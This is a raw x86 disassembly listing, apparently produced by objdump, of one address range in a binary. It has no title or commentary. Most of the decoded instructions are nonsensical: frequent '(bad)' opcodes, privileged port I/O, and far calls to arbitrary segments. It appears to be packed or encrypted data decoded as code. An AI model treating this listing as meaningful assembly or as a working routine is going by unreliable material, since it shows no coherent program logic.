  41986e:	mov    edi,0xcdb02678
  419873:	jmp    0x419897
  419875:	mov    al,0xcf
  419877:	jmp    0x419897
  419879:	bndldx (bad),[eax-0x4fe91429]
  419880:	into   
  419881:	or     DWORD PTR [edx-0x4f2a402c],edi
  419887:	test   DWORD PTR [esi],ecx
  419889:	mov    al,0xda
  41988b:	jmp    0x419897
  41988d:	mov    al,0xd9
  41988f:	arpl   WORD PTR [eax+0xb7e03ca],si
  419895:	or     eax,0xc8ff30f6
  41989a:	push   edx
  41989b:	or     al,0x34
  41989d:	sub    BYTE PTR [ecx+0x14],ah
  4198a0:	loopne 0x4198ff
  4198a2:	mov    bh,0xc7
  4198a4:	cmp    al,al
  4198a6:	popa   
  4198a7:	sbb    BYTE PTR [ebx],al
  4198a9:	inc    edx
  4198aa:	seto   BYTE PTR ds:0x3fc3de33
  4198b1:	je     0x419924
  4198b3:	sub    ch,dl
  4198b5:	xor    eax,0x90e3a908
  4198ba:	daa    
  4198bb:	sub    DWORD PTR [esi],edx
  4198bd:	pop    esp
  4198be:	int3   
  4198bf:	cmp    eax,DWORD PTR [eax]
  4198c1:	mov    WORD PTR [esi],es
  4198c3:	pop    ss
  4198c4:	sbb    BYTE PTR [ebx-0x20],dl
  4198c7:	inc    ebx
  4198c8:	sbb    BYTE PTR [edx-0x72f97306],bl
  4198ce:	mov    edx,0xfc6ed2fa
  4198d3:	dec    esp
  4198d4:	hlt    
  4198d5:	imul   ebp,esi,0xffffffee
  4198d8:	or     esp,DWORD PTR [ecx]
  4198da:	jge    0x419901
  4198dc:	in     al,0x61
  4198de:	sbb    DWORD PTR ds:[ebp+eax*1-0x5],ecx
  4198e3:	retf   
  4198e4:	sub    ecx,DWORD PTR [eax+edi*4]
  4198e7:	fnstcw WORD PTR [edx-0x80]
  4198ea:	push   esi
  4198eb:	std    
  4198ec:	call   0x2c31:0x5c7d1451
  4198f3:	mov    ah,0x70
  4198f5:	(bad)  
  4198f8:	dec    ecx
  4198f9:	mov    eax,ds:0x508c4b0a
  4198fe:	xor    BYTE PTR [edx+0x6e],dl
  419901:	in     al,0x28
  419903:	punpckhbw mm2,mm7
  419906:	cmp    ebp,DWORD PTR [ebx-0x78]
  419909:	or     BYTE PTR [esp+esi*1-0x3ef55ee1],bl
  419910:	or     ebp,DWORD PTR [esi+0x251c5d81]
  419916:	cmp    eax,ecx
  419918:	fild   DWORD PTR [eax]
  41991a:	sub    edi,DWORD PTR [ecx+0x9]
  41991d:	sub    eax,0x83c0bf13
  419922:	stc    
  419923:	cdq    
  419924:	or     BYTE PTR [ecx],bh
  419926:	add    DWORD PTR [ebp-0xb],esi
  419929:	stc    
  41992a:	stos   BYTE PTR es:[edi],al
  41992b:	out    dx,al
  41992c:	fimul  WORD PTR [ebp+0x6]
  41992f:	mov    bh,0xbe
  419931:	xor    BYTE PTR cs:[ebx+0x54310846],cl
  419938:	mov    ebx,DWORD PTR [esi+0xf]
  41993b:	and    dl,BYTE PTR [eax+0x2b]
  41993e:	xor    al,0xa
  419940:	shl    eax,0xde
  419943:	or     cl,0x2a
  419946:	or     eax,0x894b1b3b
  41994b:	sbb    edi,DWORD PTR [eax-0x7f]
  41994e:	sub    esi,DWORD PTR [esi-0x6e]
  419951:	inc    esp
  419952:	fcom   DWORD PTR [ebx+eiz*4+0x141adc18]
  419959:	push   esp
  41995a:	xchg   ebp,eax
  41995b:	sbb    bh,BYTE PTR [edi-0x1b]
  41995e:	mov    ah,BYTE PTR [ebx+eax*1+0x11]
  419962:	js     0x41994f
  419964:	adc    al,0x43
  419966:	das    
  419967:	sub    DWORD PTR [ecx+edi*4+0x45f066c],esi
  41996e:	in     al,0x89
  419970:	outs   dx,DWORD PTR ds:[esi]
  419971:	mov    edi,0x19389584
  419976:	inc    edi
  419977:	xor    BYTE PTR ds:0xfbf77b70,dh
  41997d:	leave  
  41997e:	jge    0x4199bb
  419980:	repz jle 0x41999d
  419983:	ins    BYTE PTR es:[edi],dx
  419984:	add    al,0xd8
  419986:	imul   eax,DWORD PTR [ebx-0x77],0x5f
  41998a:	or     al,0x6f
  41998c:	mov    al,BYTE PTR [eax+ecx*8]
  41998f:	daa    
  419990:	cmp    esi,ebx
  419992:	jg     0x41997a
  419994:	sbb    DWORD PTR [ebx],ebp
  419996:	mov    ecx,0x785023ea
  41999b:	sbb    DWORD PTR [ecx],ecx
  41999d:	sbb    BYTE PTR [eax],al
  41999f:	and    ebx,DWORD PTR [ebx]
  4199a1:	mov    cl,0x70
  4199a3:	mov    ds:0xdf3c38c8,eax
  4199a8:	scas   al,BYTE PTR es:[edi]
  4199a9:	inc    eax
  4199aa:	cmp    al,0xdc
  4199ac:	inc    eax
  4199ad:	(bad)  
  4199ae:	or     eax,0x6c432c50
  4199b3:	dec    ebx
  4199b4:	scas   al,BYTE PTR es:[edi]
  4199b5:	aas    
  4199b6:	mov    esi,0xe93428c6
  4199bb:	sub    ah,BYTE PTR [ebx+eax*8]
  4199be:	pop    ss
  4199bf:	pop    ebp
  4199c0:	mov    esi,edi
  4199c2:	(bad)  
  4199c3:	inc    esp
  4199c4:	cld    
  4199c5:	cmp    al,0x18
  4199c7:	lea    esi,[eax+ebx*1+0x4]
  4199cb:	inc    ebp
  4199cc:	push   ss
  4199cd:	mov    WORD PTR [eax],ds
  4199cf:	add    edx,ebx
  4199d1:	sbb    eax,DWORD PTR [ebx+0x4740bd5b]
  4199d7:	mov    al,dh
  4199d9:	or     BYTE PTR [edi-0x76],cl
  4199dc:	pop    esi
  4199dd:	pop    edi
  4199de:	mul    DWORD PTR [ecx+0x271601c2]
  4199e4:	add    ecx,DWORD PTR [ebp+0x5b]
  4199e7:	lahf   
  4199e8:	jo     0x419980
  4199ea:	ins    DWORD PTR es:[edi],dx
  4199eb:	sbb    ah,BYTE PTR [esi]
  4199ed:	or     al,0xec
  4199ef:	gs inc eax
  4199f1:	push   0xdc0968b1
  4199f6:	adc    ch,BYTE PTR [edi+0x1d]
  4199f9:	pop    es
  4199fa:	xchg   BYTE PTR [edi+0x1bf05bed],bh
  419a00:	addr16 cdq 
  419a02:	idiv   edi
  419a04:	add    dl,0x30
  419a07:	adc    al,0xc1
  419a09:	mov    BYTE PTR [esi+eax*1],dl
  419a0c:	adc    esi,DWORD PTR [edi]
  419a0e:	push   0xffffff83
  419a10:	xchg   ebx,eax
  419a11:	mov    ebx,0x484958fb
  419a16:	(bad)  [ecx-0x5e24ff45]
  419a1c:	sbb    al,0xf9
  419a1e:	push   eax
  419a1f:	shl    BYTE PTR [eax],1
  419a21:	mov    dl,BYTE PTR [edx+0x76c02c0a]
  419a27:	mov    eax,ds:0xd98a2b88
  419a2c:	sub    DWORD PTR [esi],ebx
  419a2e:	pop    ds
  419a2f:	dec    ecx
  419a30:	ja     0x419a95
  419a32:	push   ss
  419a33:	dec    ebp
  419a34:	sbb    ah,dh
  419a36:	iret   
  419a37:	adc    eax,0xf6530587
  419a3c:	sbb    esp,DWORD PTR [edi]
  419a3e:	cld    
  419a3f:	neg    eax
  419a41:	sbb    eax,eax
  419a43:	inc    eax
  419a44:	pop    ebx
  419a45:	pop    edi
  419a46:	jle    0x419ab7
  419a48:	adc    al,0xff
  419a4a:	ja     0x419a68
  419a4c:	add    dh,BYTE PTR [esi+0x22a3740d]
  419a52:	aaa    
  419a53:	mov    ecx,0x2ca5f326
  419a58:	leave  
  419a59:	pop    eax
  419a5a:	clc    
  419a5b:	mov    BYTE PTR [ebx+0x4433517f],dl
  419a61:	dec    ebp
  419a62:	push   edi
  419a63:	sub    eax,DWORD PTR [ecx+0x13]
  419a66:	xchg   esp,eax
  419a67:	cmp    BYTE PTR [eax+ebx*1-0x1f672ec0],cl
  419a6e:	add    bl,BYTE PTR [edi+0x9]
  419a71:	and    BYTE PTR [edx+0xb],ch
  419a74:	mov    eax,0x3463df9e
  419a79:	jle    0x419a3d
  419a7b:	push   edx
  419a7c:	xor    cl,dl
  419a7e:	lock push 0x1e
  419a81:	push   0x6c396aba
  419a86:	mov    WORD PTR [edi-0xa3060b],cs
  419a8c:	jl     0x419aa8
  419a8e:	add    cl,BYTE PTR [edx+0x790906]
  419a94:	sub    al,0x38
  419a96:	sub    BYTE PTR [ebp+0x2c6cad7d],bl
  419a9c:	inc    eax
  419a9d:	sub    al,0x25
  419a9f:	cmp    DWORD PTR [eax+0x3e],esp
  419aa2:	add    BYTE PTR [edx],cl
  419aa4:	pop    esp
  419aa5:	xor    edx,0xf4941d
  419aab:	mov    ebx,0xdc6b97ef
  419ab0:	or     eax,0xbb51eced
  419ab5:	mov    bl,0xbe
  419ab7:	xchg   ebx,eax
  419ab8:	inc    eax
  419ab9:	sbb    BYTE PTR [esi*1+0x287bdbd0],0x36
  419ac1:	push   ss
  419ac2:	cmp    DWORD PTR [esi],0xfffffff2
  419ac5:	push   es
  419ac6:	pushf  
  419ac7:	imul   ebp,DWORD PTR [eax+0x63886c6],0xffffffff
  419ace:	cld    
  419acf:	jmp    0xc735:0xdbe1a1ef
  419ad6:	in     al,dx
  419ad7:	sbb    DWORD PTR [edi+0x2b],eax
  419ada:	and    BYTE PTR [esp+ebp*4],al
  419add:	enter  0xc54c,0xee
  419ae1:	fcom   QWORD PTR [ebx]
  419ae3:	xor    eax,0x1f0e7502
  419ae8:	scas   al,BYTE PTR es:[edi]
  419ae9:	mov    ecx,0xc923b18b
  419aee:	inc    ebx
  419aef:	or     al,0x12
  419af1:	sbb    BYTE PTR [ecx],al
  419af3:	jbe    0x419afe
  419af5:	call   0xa172a25c
  419afa:	jnp    0x419b0c
  419afc:	call   0x7201:0xd46c281c
  419b03:	pop    esp
  419b04:	imul   ecx,DWORD PTR [ebx-0x4874ae09],0xfffffffe
  419b0b:	cmp    esi,DWORD PTR [ebp+0x4]
  419b0e:	mov    al,ds:0x5e9e562b
  419b13:	or     edi,DWORD PTR [esi]
  419b15:	fild   QWORD PTR [esi+esi*1+0x4503758c]
  419b1c:	mov    ss,eax
  419b1e:	push   eax
  419b1f:	jl     0x419b4e
  419b21:	dec    esp
  419b22:	push   0x7c
  419b24:	out    dx,eax
  419b25:	sbb    ah,BYTE PTR [ebx-0x11]
  419b28:	and    BYTE PTR [edi-0xb],bl
  419b2b:	and    al,0x24
  419b2d:	mov    eax,ds:0x108cf457
  419b32:	mov    dh,0x82
  419b34:	inc    edx
  419b35:	adc    ecx,DWORD PTR [eax+0x2c5e69fb]
  419b3b:	bound  eax,QWORD PTR [edi-0x6d]
  419b3e:	sub    al,0x7d
  419b40:	mov    ds,WORD PTR [edi-0xf5dab90]
  419b46:	clc    
  419b47:	and    ebx,DWORD PTR [ebx-0xb]
  419b4a:	pusha  
  419b4b:	fstp   DWORD PTR [esi-0x74161c73]
  419b51:	mov    edx,edx
  419b53:	mov    DWORD PTR [eax-0x5],0xfa573c0b
  419b5a:	clc    
  419b5b:	dec    ecx
  419b5c:	jl     0x419b6e
  419b5e:	lock inc DWORD PTR [esi]
  419b61:	retf   0xdd48
  419b64:	mov    al,ds:0xf842a4db
  419b69:	inc    ebx
  419b6a:	pop    eax
  419b6b:	jb     0x419b24
  419b6d:	push   eax
  419b6e:	mov    WORD PTR [edi+0x1a29136d],fs
  419b74:	mov    DWORD PTR [ebx],0x4c8d868e
  419b7a:	push   cs
  419b7b:	or     BYTE PTR [eax],ch
  419b7d:	in     eax,dx
  419b7e:	out    dx,al
  419b7f:	push   ds
  419b80:	mov    ecx,0xda754ee2
  419b85:	scas   eax,DWORD PTR es:[edi]
  419b86:	aas    
  419b87:	and    DWORD PTR [ecx+0x7f],eax
  419b8a:	sbb    dh,BYTE PTR [esi-0x7bd1503c]
  419b90:	inc    edx
  419b91:	cwde   
  419b92:	sub    eax,0xb580ff4
  419b97:	mov    ch,0x1b
  419b99:	mov    esp,0x44fc48e2
  419b9e:	out    dx,eax
  419b9f:	jmp    0x419ba5
  419ba1:	cmp    eax,esi
  419ba3:	push   es
  419ba4:	fdiv   DWORD PTR [edi+0x147b8736]
  419baa:	dec    ebx
  419bab:	inc    ebx
  419bac:	or     bh,dh
  419bae:	lds    ebp,FWORD PTR [eax]
  419bb0:	jnp    0x419c30
  419bb2:	sub    DWORD PTR [ebx-0x40],esi
  419bb5:	jle    0x419bdb
  419bb7:	push   eax
  419bb8:	clc    
  419bb9:	mov    cl,0xfa
  419bbb:	lea    ebp,[esi]
  419bbd:	or     al,BYTE PTR [ebx+0x1550fee0]
  419bc3:	pop    edx
  419bc4:	mov    WORD PTR [edx+eax*1-0x50],0x5bf5
  419bcb:	mov    esi,DWORD PTR [ecx-0x76a5f7ed]
  419bd1:	push   eax
  419bd2:	cld    
  419bd3:	call   0x3a62:0xb843bbf8
  419bda:	mov    ch,0x47
  419bdc:	int3   
  419bdd:	mov    edi,ecx
  419bdf:	in     al,dx
  419be0:	(bad)  
  419be1:	lock (bad) [ecx-0x76066808]
  419be8:	(bad)  
  419be9:	jne    0x419bf4
  419beb:	lahf   
  419bec:	mov    eax,esi
  419bee:	pushf  
  419bef:	(bad)  
  419bf0:	adc    ch,BYTE PTR [edi-0x40e8f1c0]
  419bf6:	cmp    edx,ebx
  419bf8:	fdivr  st,st(2)
  419bfa:	nop
  419bfb:	imul   ebp,DWORD PTR [ebx],0x33
  419bfe:	push   edx
  419bff:	push   eax
  419c00:	add    ecx,DWORD PTR [eax]
  419c02:	add    DWORD PTR [edx+0x8ef95a8],ebx
  419c08:	leave  
  419c09:	mov    eax,0x700cc016
  419c0e:	loopne 0x419c4c
  419c10:	mov    ds:0xfbad1b8b,al
  419c15:	adc    DWORD PTR [ecx],ebx
  419c17:	adc    al,0x53
  419c19:	add    esp,0xdc9dffc0
  419c1f:	sbb    al,BYTE PTR [edx-0xebe3b53]
  419c25:	mov    ebx,0x97f6cf8
  419c2a:	mov    bh,0xe0
  419c2c:	mov    edi,0xeb63f83b
  419c31:	pop    edi
  419c32:	lea    ebp,[esi+0x1]
  419c35:	cmp    ebp,0x289307ff
  419c3b:	push   esi
  419c3c:	push   cs
  419c3d:	loop   0x419bc0
  419c3f:	pop    ss
  419c40:	adc    eax,0xff2ba6b
  419c45:	lds    ecx,FWORD PTR [edi+0x502e1f76]
  419c4b:	out    0x7c,eax
  419c4d:	(bad)  
  419c4f:	(bad)  
  419c50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c51:	sti    
  419c52:	push   es
  419c53:	fisttp WORD PTR [ebx+0x532012cb]
  419c59:	mov    ebx,ebp
  419c5b:	add    ebx,ebx
  419c5d:	push   cs
  419c5e:	rcr    DWORD PTR [edi+0x32d2dec5],cl
  419c64:	pushf  
  419c65:	in     eax,dx
  419c66:	pop    es
  419c67:	xor    cl,BYTE PTR ds:0x33027d2f
  419c6d:	test   BYTE PTR [edx-0x47],dl
  419c70:	gs push ds
  419c72:	jl     0x419cd6
  419c74:	jmp    DWORD PTR [eax]
  419c76:	jbe    0x419c50
  419c78:	push   0x52
  419c7a:	test   al,0xb9
  419c7c:	add    al,0x45
  419c7e:	pop    esi
  419c7f:	call   0x31a8b391
  419c84:	leave  
  419c85:	push   ecx
  419c86:	and    DWORD PTR [edx+0x3a],edx
  419c89:	or     bh,cl
  419c8b:	cmp    cl,BYTE PTR [edx+0x1]
  419c8e:	mov    dh,0xb1
  419c90:	mov    esp,0x204cb35
  419c95:	je     0x419ca2
  419c97:	add    esp,DWORD PTR [ebp-0x7d]
  419c9a:	mov    edx,0xf6fef0ec
  419c9f:	jmp    0x419c89
  419ca1:	inc    edx
  419ca2:	add    BYTE PTR [ecx-0x2ed6a52f],cl
  419ca8:	jmp    0xee70ffdb
  419cad:	mov    edx,0x522d7db6
  419cb2:	cmp    si,WORD PTR [eax]
  419cb5:	and    BYTE PTR [esp+ebp*1],al
  419cb8:	pop    ss
  419cb9:	add    eax,0xd80e7404
  419cbe:	ins    BYTE PTR es:[edi],dx
  419cbf:	sti    
  419cc0:	imul   eax,DWORD PTR [esi],0x33
  419cc3:	or     bl,ch
  419cc5:	in     al,0x4
  419cc7:	add    al,BYTE PTR [edx]
  419cc9:	cmp    DWORD PTR [esi+0x3ab5f27d],ebx
  419ccf:	cmp    ecx,DWORD PTR [edx+ecx*4-0x6fb6bdf6]
  419cd6:	push   edi
  419cd7:	fimul  DWORD PTR [eax-0x76d7e8f5]
  419cdd:	xlat   BYTE PTR ds:[ebx]
  419cde:	mov    dl,dh
  419ce0:	scas   al,BYTE PTR es:[edi]
  419ce1:	or     al,0xd1
  419ce3:	or     esp,DWORD PTR [ebx-0x4d]
  419ce6:	xchg   edi,eax
  419ce7:	test   ecx,eax
  419ce9:	pop    eax
  419cea:	pop    edi
  419ceb:	sbb    BYTE PTR [edi+0x5],bl
  419cee:	loope  0x419cec
  419cf0:	mov    ebp,0x37602061
  419cf5:	xchg   esi,eax
  419cf6:	int    0x40
  419cf8:	cld    
  419cf9:	ret    
  419cfa:	retf   0xc0d
  419cfd:	aam    0x19
  419cff:	aas    
  419d00:	out    0xa3,eax
  419d02:	mov    ds:0x70be85fd,al
  419d07:	adc    cl,al
  419d09:	mov    edi,DWORD PTR [ecx+0x51]
  419d0c:	push   esi
  419d0d:	cld    
  419d0e:	add    edx,edi
  419d10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d11:	ins    DWORD PTR es:[edi],dx
  419d12:	mov    ebx,0xec8a6b10
  419d17:	mov    edi,0x13124e8b
  419d1c:	adc    DWORD PTR [ebx-0x39f74278],ebp
  419d22:	repz push ss
  419d24:	ins    BYTE PTR es:[edi],dx
  419d25:	(bad)  {k5}
  419d2a:	iret   
  419d2b:	inc    ebx
  419d2c:	popa   
  419d2d:	inc    ecx
  419d2e:	pusha  
  419d2f:	cmp    edx,DWORD PTR [eax]
  419d31:	xchg   ebp,eax
  419d32:	sbb    eax,0x3bda5dad
  419d37:	or     BYTE PTR [ebx-0x7bd27176],bh
  419d3d:	or     bl,BYTE PTR [eax+edi*8-0x25]
  419d41:	jno    0x419d72
  419d43:	aam    0x57
  419d45:	ror    DWORD PTR [ecx-0x3bcba32],cl
  419d4b:	xor    al,0xb1
  419d4d:	xchg   esp,eax
  419d4e:	arpl   WORD PTR [eax],si
  419d50:	mov    ah,0xc7
  419d52:	push   ss
  419d53:	pop    ebx
  419d54:	dec    ebx
  419d55:	push   0x67
  419d57:	(bad)  
  419d58:	sahf   
  419d59:	mov    dh,0x89
  419d5b:	cli    
  419d5c:	bound  eax,QWORD PTR [ebx]
  419d5e:	push   ebx
  419d5f:	push   cs
  419d60:	pop    eax
  419d61:	maskmovq mm2,(bad)
  419d62:	not    DWORD PTR [edi]
  419d64:	mov    ebx,0x4f9dc464
  419d69:	clc    
  419d6a:	inc    ebp
  419d6b:	jo     0x419cf6
  419d6d:	retf   0x50e9
  419d70:	pop    ebx
  419d71:	jecxz  0x419db3
  419d73:	in     al,0x89
  419d75:	retf   0x1b6b
  419d78:	push   ebx
  419d79:	xor    DWORD PTR [eax-0x7a3b26],edi
  419d7f:	mov    ds:0xc4c1494,eax
  419d84:	cmp    esi,ebx
  419d86:	test   DWORD PTR [edx],edx
  419d88:	pop    ss
  419d89:	push   0x79
  419d8b:	cmp    ah,0x4a
  419d8e:	out    dx,eax
  419d8f:	add    esi,DWORD PTR [esi+0x1560edc2]
  419d95:	or     DWORD PTR [ebx],eax
  419d97:	(bad)  
  419d99:	iret   
  419d9a:	push   cs
  419d9b:	es dec edx
  419d9d:	mov    ebx,0xa20575a8
  419da2:	push   ecx
  419da3:	pop    ss
  419da4:	jae    0x419db2
  419da6:	ja     0x419da4
  419da8:	add    DWORD PTR [ebx-0x1],esp
  419dab:	addr16 mov esi,0x37ff243c
  419db1:	add    esi,DWORD PTR [edi]
  419db3:	dec    ebx
  419db4:	jmp    0x419dbe
  419db6:	xchg   ecx,eax
  419db7:	push   eax
  419db8:	mov    cl,0x4d
  419dba:	or     eax,0x9c442fbf
  419dbf:	sbb    BYTE PTR [ecx+0x4f0a1bf2],cl
  419dc5:	add    esi,ecx
  419dc7:	mov    ecx,ebp
  419dc9:	sub    eax,0x754bed15
  419dce:	jmp    0xe64dbd98
  419dd3:	xchg   ecx,eax
  419dd4:	push   cs
  419dd5:	lock mov ebx,0x925a4a93
  419ddb:	pop    eax
  419ddc:	lea    esp,[esp+edx*4]
  419ddf:	jmp    eax
  419de1:	jnp    0x419d6f
  419de3:	mov    al,ds:0xce6c29d5
  419de8:	and    edi,edi
  419dea:	mov    bh,0x5d
  419dec:	inc    edi
  419ded:	repnz push 0xe98b6b6b
  419df3:	mov    edx,DWORD PTR [edi-0x4]
  419df6:	sub    eax,edx
  419df8:	ja     0x419dfc
  419dfa:	add    edx,eax
  419dfc:	push   edx
  419dfd:	neg    bh
  419dff:	loop   0x419dc3
  419e01:	shr    edx,0xd6
  419e04:	mov    esp,DWORD PTR es:[esi]
  419e07:	pop    ds
  419e08:	cmp    ecx,ebx
  419e0a:	jne    0x419e64
  419e0c:	dec    edx
  419e0d:	je     0x419e24
  419e0f:	in     al,dx
  419e10:	mov    ebx,0x4d1ce83
  419e15:	pop    edx
  419e16:	or     al,0x4b
  419e18:	add    di,0x8
  419e1c:	lahf   
  419e1d:	or     ebx,0xffffffd6
  419e20:	(bad)  
  419e22:	stos   DWORD PTR es:[edi],eax
  419e23:	or     al,BYTE PTR [esp+eax*1]
  419e26:	pop    edx
  419e27:	or     DWORD PTR [edi+0x2a46df2c],edi
  419e2d:	and    ch,BYTE PTR [ebx]
  419e2f:	cmp    BYTE PTR [ecx+0x17],al
  419e32:	cmp    ch,bh
  419e34:	jne    0x419e70
  419e36:	cdq    
  419e37:	or     BYTE PTR [ebx+0x6f],dl
  419e3a:	push   es
  419e3b:	adc    BYTE PTR [ecx-0x31e3b41d],al
  419e41:	sbb    eax,0x3805cefb
  419e46:	daa    
  419e47:	add    eax,eax
  419e49:	jmp    0x419e6e
  419e4b:	pusha  
  419e4c:	jmp    0x419e6a
  419e4e:	push   0x6
  419e50:	dec    edx
  419e51:	div    DWORD PTR [edi-0x23]
  419e54:	adc    eax,0x2d10305a
  419e59:	or     al,0xc1
  419e5b:	jmp    0x112d5f70
  419e60:	or     eax,0x4c05b02
  419e65:	xchg   ebx,eax
  419e66:	imul   esp,esp,0xffffff95
  419e69:	mov    eax,0x9d3f0a3b
  419e6e:	jne    0x419ea1
  419e70:	lds    edx,FWORD PTR [edi+0x3274f138]
  419e76:	push   ebx
  419e77:	out    dx,eax
  419e78:	push   cs
  419e79:	imul   eax,ebx,0xffffffb2
  419e7c:	inc    esi
  419e7d:	iret   
  419e7e:	adc    edx,DWORD PTR [eax+0x49]
  419e81:	pop    eax
  419e82:	arpl   dx,si
  419e84:	pushf  
  419e85:	aad    0x8
  419e87:	adc    cl,BYTE PTR [eax+0x40]
  419e8a:	add    esi,DWORD PTR [edi-0x19]
  419e8d:	lods   al,BYTE PTR ds:[esi]
  419e8e:	js     0x419eeb
  419e90:	mov    eax,edx
  419e92:	dec    ebx
  419e93:	xor    DWORD PTR [eax+0x2d],ebx
  419e96:	mov    ebx,DWORD PTR [eax+0x12]
  419e99:	std    
  419e9a:	fild   WORD PTR [eax+0x4a2635fc]
  419ea0:	jl     0x419ebd
  419ea2:	cmp    edx,ebx
  419ea4:	jge    0x419ec5
  419ea6:	sub    ebx,edx
  419ea8:	cmp    eax,DWORD PTR [edx+ebp*2-0x5ee6257b]
  419eaf:	ret    0xf1f7
  419eb2:	or     edi,DWORD PTR [ebp+0x115cd345]
  419eb8:	mov    cl,0xeb
  419eba:	in     eax,0x89
  419ebc:	nop
  419ebd:	jmp    0x419e5c
  419ebf:	mov    DWORD PTR [edx+0x5ba21266],ebx
  419ec5:	ds ds inc eax
  419ec8:	out    dx,eax
  419ec9:	clc    
  419eca:	and    BYTE PTR [ebp+ecx*4+0x31],dh
  419ece:	inc    ebx
  419ecf:	mov    ecx,DWORD PTR [edi-0x4]
  419ed2:	push   edi
  419ed3:	jp     0x419f1f
  419ed5:	js     0x419ef2
  419ed7:	mov    ah,BYTE PTR [edx+0x6c6e3bb]
  419edd:	inc    esi
  419ede:	call   0x110db361
  419ee3:	mov    ebx,ecx
  419ee5:	sbb    al,0xd1
  419ee7:	mov    eax,ds:0xc5b82bb0
  419eec:	out    0x41,al
  419eee:	in     al,dx
  419eef:	pop    edx
  419ef0:	fbstp  TBYTE PTR [edx+0x572db501]
  419ef6:	jo     0x419f77
  419ef8:	clc    
  419ef9:	cmc    
  419efa:	and    eax,0xf923c2a
  419eff:	mov    ecx,0x6e8dc2e8
  419f04:	fnsave [ebp+0x2356c748]
  419f0a:	cmp    DWORD PTR [eax-0x66],0x75
  419f0e:	sbb    eax,0x85bf5d2e
  419f13:	or     ebx,DWORD PTR [esi-0x3e]
  419f16:	or     ebx,ebx
  419f18:	loopne 0x419ed9
  419f1a:	lock pop eax
  419f1c:	mov    dh,0x89
  419f1e:	sbb    BYTE PTR [ebp+0x43],ch
  419f21:	outs   dx,DWORD PTR ds:[esi]
  419f22:	in     eax,0x70
  419f24:	cld    
  419f25:	(bad)  
  419f26:	cli    
  419f27:	jmp    0x419f51
  419f29:	retf   
  419f2a:	mov    ecx,DWORD PTR [ebx+0x77]
  419f2d:	pop    ebx
  419f2e:	sub    al,0x31
  419f30:	push   0xf139fcfa
  419f35:	jl     0x419f9c
  419f37:	icebp  
  419f38:	aaa    
  419f39:	mov    eax,DWORD PTR [esi]
  419f3b:	pop    eax
  419f3c:	scas   eax,DWORD PTR es:[edi]
  419f3d:	fidiv  WORD PTR [ebx-0x1ddb9784]
  419f43:	adc    BYTE PTR [eax-0x36],dl
  419f46:	dec    esp
  419f47:	fucom  st(4)
  419f49:	(bad)  
  419f4a:	out    dx,eax
  419f4b:	cmp    eax,DWORD PTR [edx]
  419f4d:	scas   eax,DWORD PTR es:[edi]
  419f4e:	or     DWORD PTR [ecx+0x6],0x52
  419f52:	pop    ss
  419f53:	pop    esp
  419f54:	pcmpeqd mm6,QWORD PTR [esi+0x32]
  419f58:	add    bh,bh
  419f5a:	push   cs
  419f5b:	push   eax
  419f5c:	push   ss
  419f5d:	pop    eax
  419f5e:	stos   DWORD PTR es:[edi],eax
  419f5f:	jbe    0x419f63
  419f61:	arpl   WORD PTR [edi-0x56],bp
  419f64:	jb     0x419f72
  419f66:	repz push eax
  419f68:	sbb    al,0x1f
  419f6a:	int    0x46
  419f6c:	and    ch,ah
  419f6e:	call   0x46fde142
  419f73:	mov    bl,0x45
  419f75:	jb     0x419fce
  419f77:	mov    ch,0xa
  419f79:	mov    cl,0x51
  419f7b:	lock xchg ecx,eax
  419f7d:	sar    BYTE PTR [ecx-0x42],0x72
  419f81:	push   esp
  419f82:	jno    0x419f87
  419f84:	daa    
  419f85:	pop    ss
  419f86:	enter  0x3372,0x5d
  419f8a:	pop    es
  419f8b:	jo     0x419fcd
  419f8d:	stc    
  419f8e:	cmp    DWORD PTR [esi+edi*2],0x2aeb1c34
  419f95:	and    DWORD PTR [ecx+0x35018390],ebx
  419f9b:	js     0x41a00d
  419f9d:	call   0x5f78:0x35c963ed
  419fa4:	leave  
  419fa5:	xchg   esp,eax
  419fa6:	or     al,0x50
  419fa8:	mov    ds:0xa5d09397,eax
  419fad:	pop    ss
  419fae:	int3   
  419faf:	(bad)  
  419fb0:	pop    edx
  419fb1:	push   DWORD PTR [edx]
  419fb3:	xchg   ebp,eax
  419fb4:	pop    ebx
  419fb5:	nop
  419fb6:	jne    0x419ffa
  419fb8:	adc    DWORD PTR [eax+0xcec94e7],edx
  419fbe:	xchg   ebx,eax
  419fbf:	inc    eax
  419fc0:	and    eax,DWORD PTR [ebx]
  419fc2:	or     eax,0x8c903311
  419fc7:	pop    ds
  419fc8:	fild   DWORD PTR [edi+0x43]
  419fcb:	add    al,0x5
  419fcd:	add    cl,dl
  419fcf:	xor    al,0x96
  419fd1:	fistp  WORD PTR [esi]
  419fd3:	dec    eax
  419fd4:	retf   
  419fd5:	(bad)  
  419fd6:	loope  0x41a018
  419fd8:	call   0x64b4146c
  419fdd:	or     ch,BYTE PTR [ecx-0x66]
  419fe0:	mov    edx,DWORD PTR [ecx+0x54]
  419fe3:	inc    ecx
  419fe4:	xor    eax,0x340e4030
  419fe9:	mov    ebx,0xd34d2766
  419fee:	lods   eax,DWORD PTR ds:[esi]
  419fef:	sub    al,0x2
  419ff1:	pop    ds
  419ff2:	data16 je 0x41a016
  419ff5:	sbb    eax,0xbe937016
  419ffa:	daa    
  419ffb:	cvtps2pd xmm2,QWORD PTR [edi]
  419ffe:	or     DWORD PTR [ecx+0xa],esi
  41a001:	call   0xdebb:0x8fc10720
  41a008:	stc    
  41a009:	test   al,0x7f
  41a00b:	clc    
  41a00c:	sub    bh,BYTE PTR [esi+eax*8-0x47c63a5]
  41a013:	add    DWORD PTR [ebp-0x1f],edi
  41a016:	sbb    cl,BYTE PTR [edx]
  41a018:	outs   dx,DWORD PTR ds:[esi]
  41a019:	or     al,BYTE PTR [edi]
  41a01b:	dec    ebx
  41a01c:	cmp    eax,ebx
  41a01e:	dec    eax
  41a01f:	dec    esi
  41a020:	dec    DWORD PTR [esi]
  41a022:	sbb    eax,0xffffffe0
  41a025:	fmulp  st(1),st
  41a027:	sub    eax,ebx
  41a029:	cmp    edi,eax
  41a02b:	orps   xmm0,XMMWORD PTR [ebx]
  41a02e:	shr    BYTE PTR ds:0x7845c0f1,cl
  41a034:	dec    ebp
  41a035:	or     BYTE PTR [ecx+0x34e9488a],dl
  41a03b:	pushf  
  41a03c:	jmp    0xb1bc:0x46512f8d
  41a043:	sub    esp,eax
  41a045:	call   0xd708:0x332247e2
  41a04c:	push   es
  41a04d:	pop    ecx
  41a04e:	pop    edi
  41a04f:	and    bl,ah
  41a051:	dec    ebp
